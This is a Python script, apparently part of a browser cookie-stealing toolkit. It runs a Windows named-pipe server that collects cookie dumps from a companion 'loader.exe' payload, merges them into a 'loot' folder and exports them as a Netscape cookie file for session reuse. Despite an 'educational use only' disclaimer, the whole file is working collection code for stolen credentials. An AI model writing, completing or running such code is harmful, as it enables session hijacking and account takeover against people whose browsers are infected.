# sink.py -- server for \\.\pipe\ck_pipe: receives the payload dump and writes it to disk.
#          Run BEFORE loader.exe: the payload waits ~10 s and, with nobody on the other side,
#          dumps everything to C:\ProgramData\cookielog\drop.json outside the reports.
#
#   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING.
#   Only use on systems you own or are explicitly authorized to test.
import ctypes, json, os, time
from ctypes import wintypes

PIPE, BUFSZ = r"\\.\pipe\ck_pipe", 1 << 20
HERE  = os.path.dirname(os.path.abspath(__file__))
LOOT  = os.path.join(HERE, "loot")
os.makedirs(LOOT, exist_ok=True)
TXT   = os.path.join(LOOT, "cookies_all.txt")
JSONF = os.path.join(LOOT, "cookies_all.json")

PIPE_ACCESS_DUPLEX, PIPE_UNLIMITED = 0x03, 255
PIPE_REJECT_REMOTE_CLIENTS = 0x08
ERROR_PIPE_CONNECTED, ERROR_BROKEN_PIPE = 534, 109
INVALID = wintypes.HANDLE(-1).value                 # 0xFFFFFFFFFFFFFFFF, not -1

k32 = ctypes.WinDLL("kernel32", use_last_error=True)   # WinDLL = stdcall; use_last_error for GetLastError
H, D, B, L = wintypes.HANDLE, wintypes.DWORD, wintypes.BOOL, wintypes.LPVOID

def proto(name, restype, *args):                     # NO handle call without this
    f = getattr(k32, name); f.restype = restype; f.argtypes = list(args) or None
    return f

CreateNamedPipeW    = proto("CreateNamedPipeW", H, wintypes.LPCWSTR, D, D, D, D, D, D, L)
ConnectNamedPipe    = proto("ConnectNamedPipe", B, H, L)
ReadFile            = proto("ReadFile", B, H, L, D, ctypes.POINTER(D), L)
DisconnectNamedPipe = proto("DisconnectNamedPipe", B, H)
CloseHandle         = proto("CloseHandle", B, H)


def serve():
    """Creates the pipe ONCE and keeps listening for connections in a loop on the same handle.
    Between DisconnectNamedPipe and ConnectNamedPipe the handle remains valid:
    there is no window where the pipe ceases to exist."""
    h = CreateNamedPipeW(PIPE, PIPE_ACCESS_DUPLEX, 0, PIPE_UNLIMITED,
                         BUFSZ, BUFSZ, PIPE_REJECT_REMOTE_CLIENTS, None)
    if h == INVALID:
        raise ctypes.WinError(ctypes.get_last_error())
    print(f"[sink] listening on {PIPE}  (Ctrl+C to stop)")
    try:
        while True:
            # wait for a client to connect (blocking)
            if not ConnectNamedPipe(h, None):
                e = ctypes.get_last_error()
                if e != ERROR_PIPE_CONNECTED:            # 534 = already connected, not an error
                    raise ctypes.WinError(e)
            print("[sink] client connected, reading...")
            buf, got, data = ctypes.create_string_buffer(BUFSZ), D(0), bytearray()
            while True:
                if not ReadFile(h, buf, BUFSZ, ctypes.byref(got), None):
                    e = ctypes.get_last_error()
                    if e == ERROR_BROKEN_PIPE: break     # the loader closed: dump complete
                    raise ctypes.WinError(e)
                if got.value == 0: break
                data.extend(buf.raw[:got.value])
            DisconnectNamedPipe(h)                        # disconnects the client, KEEPS the handle
            yield bytes(data)
            print("[sink] waiting for loader...")
    finally:
        CloseHandle(h)


def merge(new):
    old = []
    if os.path.exists(JSONF):
        try:
            with open(JSONF, encoding="utf-8") as f: old = json.load(f)
        except Exception: pass
    seen, out = {}, []
    for c in old + list(new):
        if not c.get("name"): continue
        # key without value: cookies with the same name/path but a different value keep the most recent one
        k = (c.get("browser"), c.get("profile"), c.get("domain"), c["name"], c.get("path"))
        if k not in seen:
            seen[k] = len(out); out.append(c)
        else:
            out[seen[k]] = c   # overwrites with the most recent version
    return out


def write_txt(rows):
    try:
        from cookielog import netscape
        body = netscape(rows)
    except Exception:
        l = []
        for c in rows:
            d = c["domain"] if c["domain"].startswith(".") else "." + c["domain"]
            l.append("\t".join([d, "TRUE", c.get("path") or "/",
                                "TRUE" if c.get("secure") else "FALSE",
                                str(int(c.get("expires") or 0)), c["name"], c.get("value") or ""]))
        body = "# Netscape HTTP Cookie File\n" + "\n".join(l) + "\n"
    with open(TXT, "w", encoding="utf-8") as f: f.write(body)


def main():
    print("[sink] waiting for loader...")
    for raw in serve():
        try:
            obj = json.loads(raw.decode("utf-8", "replace"))
        except Exception as ex:
            print(f"[-] unreadable JSON ({len(raw)} bytes): {ex}"); continue
        rows = obj.get("cookies", obj) if isinstance(obj, dict) else obj
        alls = merge(rows)
        with open(JSONF, "w", encoding="utf-8") as f:
            json.dump(alls, f, ensure_ascii=False, indent=1)
        write_txt(alls)
        top = {}
        for c in rows: top[c.get("domain", "?")] = top.get(c.get("domain", "?"), 0) + 1
        s = sum(1 for c in rows if not int(c.get("expires") or 0))
        print(f"[+] {len(rows)} cookies in this dump ({s} session) | total: {len(alls)} -> {TXT}")
        for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:12]: print(f"    {n:5d}  {d}")

main()
